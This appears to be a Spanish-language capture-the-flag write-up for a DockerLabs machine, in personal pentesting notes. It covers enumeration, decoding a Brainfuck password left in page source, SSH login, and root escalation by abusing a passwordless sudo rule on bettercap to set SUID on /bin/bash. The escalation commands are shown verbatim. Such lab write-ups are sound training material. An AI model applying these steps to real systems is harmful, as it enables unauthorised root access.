## Fase de Reconocimiento y Descubrimiento (Enumeración)

### Escaneo de Puertos (Nmap)
Realizamos un escaneo inicial con nmap para identificar los servicios activos en la máquina objetivo:

![[Pasted image 20260701212945.png]]

**Servicios identificados:**
* **Puerto 22/TCP (SSH):** Servicio de acceso seguro SSH abierto. Ver teoría en [[Pentesting Notes/1_Enumeration/SSH\|SSH.md]].
* **Puerto 80/TCP (HTTP):** Servidor web expuesto. Ver teoría en [[Pentesting Notes/1_Enumeration/HTTP & HTTPS\|HTTP & HTTPS.md]].

---

## Enumeración Web

### Inspección del Servidor Web e Identificación de Tecnologías
Al acceder al sitio web a través del puerto 80, nos encontramos con la página por defecto de Apache:

![[Pasted image 20260701213101.png]]

whatweb no reporta tecnologías o CMS adicionales de interés:

![[Pasted image 20260701213107.png]]

Al inspeccionar el código fuente de la página por defecto de Apache, localizamos en la parte inferior un comentario con una cadena de caracteres que parece estar ofuscada:

![[Pasted image 20260701214629.png]]

* **Análisis de Ofuscación:** La cadena está codificada en el lenguaje esotérico Brainfuck. Al decodificarla, obtenemos la siguiente frase: `bebeaguaqueessano`.

![[Pasted image 20260701214656.png]]

### Fuzzing de Directorios (ffuf)
Realizamos un escaneo de directorios con ffuf buscando recursos ocultos dentro de la estructura web:

```bash
ffuf -w /usr/share/wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt:FUZZ -u 'http://172.17.0.2/images/FUZZ' -c -e .php,.html,.py,.txt,.bak -ic
```

![[Pasted image 20260701213407.png]]

* **Hallazgo:** Identificamos un directorio `/images` que contiene una imagen llamada `agua_ssh.jpg`:

![[Pasted image 20260701213445.png]]

El nombre de la imagen (`agua_ssh`) nos sugiere el nombre del usuario del sistema: `agua`.

---

## Fase de Explotación / Intrusión

### Acceso vía SSH
Con el nombre de usuario (`agua`) y la contraseña decodificada del código fuente (`bebeaguaqueessano`), intentamos establecer una conexión por SSH:

```bash
ssh agua@172.17.0.2
```

![[Pasted image 20260701214807.png]]

Establecemos el acceso inicial con éxito al sistema.

---

## Escalada de Privilegios

### Enumeración de Permisos Sudo
Como usuario de bajos privilegios `agua`, procedemos a listar qué comandos podemos ejecutar con privilegios de superusuario utilizando el comando `sudo -l`:

```bash
sudo -l
```

* **Nota Técnica:** El comando `sudo -l` (list) interroga al archivo de configuración `/etc/sudoers` para comprobar qué privilegios tiene asignados el usuario actual en el sistema. Nos muestra qué binarios o scripts podemos ejecutar como superusuario (root) o como otros usuarios, indicando si requieren contraseña.

![[Pasted image 20260701214858.png]]

* **Vulnerabilidad de Configuración:** El usuario `agua` puede ejecutar la herramienta `/usr/bin/bettercap` como `root` sin necesidad de ingresar una contraseña (NOPASSWD). Ver teoría en [[Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions\|Permissions.md]].

### Explotación de Bettercap
La herramienta `bettercap` permite ejecutar comandos del sistema desde su consola interactiva anteponiendo el carácter `!`. Dado que la estamos ejecutando con `sudo`, estos comandos del sistema se ejecutan con privilegios de root:

```bash
sudo /usr/bin/bettercap -eval "! id"
```

![[Pasted image 20260701215249.png]]

Para obtener y mantener una consola de root permanente, realizamos lo siguiente:

1. Iniciamos `bettercap` con privilegios de root:
   ```bash
   sudo /usr/bin/bettercap
   ```
2. Desde su consola interactiva, asignamos permisos SUID a la shell `/bin/bash` y salimos:
   ```text
   » !chmod u+s /bin/bash
   » quit
   ```
3. Ejecutamos la shell de bash en modo privilegiado:
   ```bash
   /bin/bash -p
   ```

![[Pasted image 20260701215540.png]]

* **Explicación Técnica del Vector:**
  * Al ejecutar `chmod u+s /bin/bash`, activamos el bit SUID (Set User ID) sobre la shell de bash. Esto significa que cuando cualquier usuario del sistema ejecute `/bin/bash`, esta se ejecutará con los privilegios del propietario del archivo (que es el usuario `root`).
  * Las versiones modernas de `bash` incluyen una medida de seguridad que detecta si el usuario que la ejecuta no es el dueño original, procediendo a descartar los privilegios elevados (reseteando el UID efectivo al UID real del usuario).
  * El parámetro `-p` (privileged mode) desactiva esta medida de protección, forzando a bash a mantener los privilegios de root heredados del bit SUID.

---

## Relaciones y Conceptos
* **Teoría:** [[Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions\|Linux Privilege Escalation - Permissions.md]], [[Pentesting Notes/1_Enumeration/SSH\|SSH.md]], [[Pentesting Notes/1_Enumeration/HTTP & HTTPS\|HTTP & HTTPS.md]]
* **Laboratorios Relacionados:** [[Laboratorios/DockerLabs/Facil/Duque\|Duque]] (Comparte escalada por explotación indirecta de SUID), [[Laboratorios/DockerLabs/Facil/Patriaquerida\|Patriaquerida]] (Comparte escalada por binarios SUID)
